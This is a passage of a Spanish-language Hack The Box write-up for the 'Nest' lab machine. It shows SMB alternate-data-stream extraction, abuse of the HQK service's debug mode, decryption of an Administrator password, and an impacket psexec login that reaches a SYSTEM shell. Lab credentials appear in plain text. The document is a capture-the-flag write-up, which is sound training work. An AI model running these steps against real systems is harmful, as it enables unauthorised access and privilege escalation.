smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sat Jan &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 17:04:21 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  Administrator                       D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Aug  &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; 09:08:23 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  C.Smith                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Jan &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 01:21:44 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
  L.Frost                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:03:01 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  R.Thompson                          D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Thu Aug  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 11:02:50 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  TempUser                            D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Wed Aug  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 16:55:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;10485247&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;6449700&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C.Smith\HQK Reporting\&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  .                                   D        0  Thu Aug  8 17:06:17 2019
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  ..                                  D        0  Thu Aug  8 17:06:17 2019
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  AD Integration Module               D        0  Fri Aug  9 06:18:42 2019
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  Debug Mode Password.txt             A        0  Thu Aug  8 17:08:17 2019
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  HQK_Config_Backup.xml               A      249  Thu Aug  8 17:09:05 2019
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;		10485247 blocks of size 4096. 6449700 blocks available
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; allinfo &amp;#34;&lt;/span&gt;Debug Mode Password.txt&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;altname: DEBUGM~1.TXT
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;create_time:    Thu Aug  8 05:06:12 PM 2019 CST
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;access_time:    Thu Aug  8 05:06:12 PM 2019 CST
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;write_time:     Thu Aug  8 05:08:17 PM 2019 CST
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;change_time:    Thu Aug  8 05:08:17 PM 2019 CST
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;attributes: A (20)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;stream: [::&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;], 0 bytes
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;stream: [:Password:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;], 15 bytes
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; get &amp;#34;&lt;/span&gt;Debug Mode Password.txt:Password:&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; of size 15 as Debug Mode Password.txt:Password:&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$DATA&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;smb: \C.Smith\HQK Reporting\&amp;gt; exit
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;root@aoiri:~/htb# cat Debug\ Mode\ Password.txt\:Password\:\$DATA 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;WBQ201953D8w 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;root@aoiri:~/htb#
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://superuser.com/a/1520272&#34;&gt;&lt;strong&gt;Data Streams - SAMBA&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;hqk-reporting-service-v12---puerto-4386&#34;&gt;HQK Reporting Service V1.2 - Puerto 4386&lt;/h3&gt;
&lt;p&gt;En el segundo puerto utilizamos telnet para conectarnos, y por lo que parece es un servicio en el cual podemos ejecutar ciertos comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# rlwrap telnet 10.10.10.178 &lt;span class=&#34;m&#34;&gt;4386&lt;/span&gt;
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is &lt;span class=&#34;s1&#34;&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.

HQK Reporting Service V1.2

&amp;gt;HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &amp;lt;Directory_Name&amp;gt;
RUNQUERY &amp;lt;Query_ID&amp;gt;
DEBUG &amp;lt;Password&amp;gt;
HELP &amp;lt;Command&amp;gt;
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Enumeramos los querys que existen en el servicio y por lo que parece el servicio utiliza carpetas como directorio y ejecuta los querys (archivos) que existen el directorio, por lo que nos podemos mover a traves de C:\ como si fuera una consola pero con distintos comandos.&lt;/p&gt;
&lt;p&gt;Uno de los comandos interesante es el DEBUG ya que al utilizar este comando junto con la contraseña, tenemos nuevos comandos los cuales podemos ejecutar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to view additional commands that are now available
&amp;gt;HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &amp;lt;Directory_Name&amp;gt;
RUNQUERY &amp;lt;Query_ID&amp;gt;
DEBUG &amp;lt;Password&amp;gt;
HELP &amp;lt;Command&amp;gt;
SERVICE
SESSION
SHOWQUERY &amp;lt;Query_ID&amp;gt;

&amp;gt;SETDIR ..

Current directory &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to HQK
&amp;gt;LIST

Use the query ID numbers below with the RUNQUERY &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; and the directory names with the SETDIR &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;

 QUERY FILES IN CURRENT DIRECTORY

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DIR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  ALL QUERIES
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DIR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  LDAP
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DIR&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;  Logs
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HqkSvc.exe
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HqkSvc.InstallState
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HQK_Config.xml

Current Directory: HQK
&amp;gt;SHOWQUERY &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;

&amp;lt;?xml &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;?&amp;gt;
&amp;lt;ServiceSettings xmlns:xsi&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34;&lt;/span&gt; xmlns:xsd&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/2001/XMLSchema&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;Port&amp;gt;4386&amp;lt;/Port&amp;gt;
  &amp;lt;DebugPassword&amp;gt;WBQ201953D8w&amp;lt;/DebugPassword&amp;gt;
  &amp;lt;QueryDirectory&amp;gt;C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\H&lt;/span&gt;QK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;LL QUERIES&amp;lt;/QueryDirectory&amp;gt;
&amp;lt;/ServiceSettings&amp;gt;

&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de los directorios encontramos la contraseña del usuario Administrator.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Current Directory: HQK
&amp;gt;SETDIR LDAP

Current directory &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to LDAP
&amp;gt;LIST

Use the query ID numbers below with the RUNQUERY &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; and the directory names with the SETDIR &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;

 QUERY FILES IN CURRENT DIRECTORY

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   HqkLdap.exe
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;   Ldap.conf

Current Directory: LDAP
&amp;gt;SHOWQUERY &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;

&lt;span class=&#34;nv&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nest.local
&lt;span class=&#34;nv&#34;&gt;Port&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;389&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;BaseOu&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;OU&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;WBQ Users,OU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Production,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nest,DC&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Administrator
&lt;span class=&#34;nv&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;

&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;dnspy---hqkldapexe&#34;&gt;DNSPY - HqkLdap.exe&lt;/h3&gt;
&lt;p&gt;Utilizamos DNSPY para desensamblar el archivo ejecutable que encontramos, al analizar el codigo vemos que utiliza la misma encriptacion que el proyecto &amp;lsquo;RU Scanner&amp;rsquo; con los mismos parametros.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200131_172433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el projecto &amp;lsquo;RU Scanner&amp;rsquo; con los parametros de encriptacion pasando la contraseña de administrador.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vb&#34; data-lang=&#34;vb&#34;&gt;&lt;span class=&#34;n&#34;&gt;Console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Decrypted: &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;667912&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;1313Rf99&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;1L1SA61493DRV53Z&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Threading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Thread&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;50000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;VB:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200131_172742.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Credenciales:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Administrator:XtH4nkS4Pl4y1nGX
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;psexec&#34;&gt;PSEXEC&lt;/h3&gt;
&lt;p&gt;Utilizamos psexec.py de impacket para obtener nuestra shell y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/Screenshot_20200131_173010.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# /root/tools/impacket/examples/psexec.py &lt;span class=&#34;s1&#34;&gt;&amp;#39;Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178&amp;#39;&lt;/span&gt;
Impacket v0.9.20 - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.178.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found writable share ADMIN$
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Uploading file GHkDSZLH.exe
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.178.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating service QTBl on 10.10.10.178.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service QTBl.....
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Press &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; extra shell commands
Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 6.1.7601&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2009&lt;/span&gt; Microsoft Corporation.  All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;type C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot.txt
6594c2e&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;94b878c41
C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
